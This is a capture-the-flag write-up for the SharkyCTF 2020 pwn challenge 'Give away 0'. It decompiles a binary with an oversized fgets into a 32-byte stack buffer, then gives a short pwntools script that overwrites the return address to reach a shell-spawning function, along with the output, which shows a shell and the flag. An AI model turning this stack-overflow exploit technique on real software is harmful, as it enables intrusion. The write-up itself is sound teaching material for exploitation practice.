# SharkyCTF 2020

## Give away 0

> 160
>
> Home sweet home.
>
> Creator: Hackhim
>
> `nc sharkyctf.xyz 20333`
>
> [`0_give_away`](0_give_away)

Tags: _pwn_ _bof_ _x86-64_


## Summary

Overflow buffer; overwrite return address with address of win function.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

    
### Decompile with Ghidra

```c
void vuln(void)

{
  char local_28 [32];
  
  fgets(local_28,0x32,stdin);
  return;
}
```

`32 != 0x32` (`50`) is the vulnerability.  With no PIE overwriting the return address in the stack and calling `win_func` is trivial:

```c
void win_func(void)

{
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}
```

Just write `0x28` bytes to get to the return address in the stack:

```
             undefined         AL:1               <RETURN>
             undefined1        Stack[-0x28]:1     local_28
```

Then the address of `win_func`.


## Exploit

```python
#!/usr/bin/python3

from pwn import *

#p = process('./0_give_away')
p = remote('sharkyctf.xyz', 20333)

binary = ELF('./0_give_away')
win = binary.symbols['win_func']

payload  = 0x28 * b'A'
payload += p64(win)

p.sendline(payload)
p.interactive()
```

Output:

```
[+] Opening connection to sharkyctf.xyz on port 20333: Done
[*] '/pwd/datajerk/sharkyctf2020/giveaway0/0_give_away'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
$ cat flag.txt
shkCTF{#Fr33_fL4g!!_<3}
```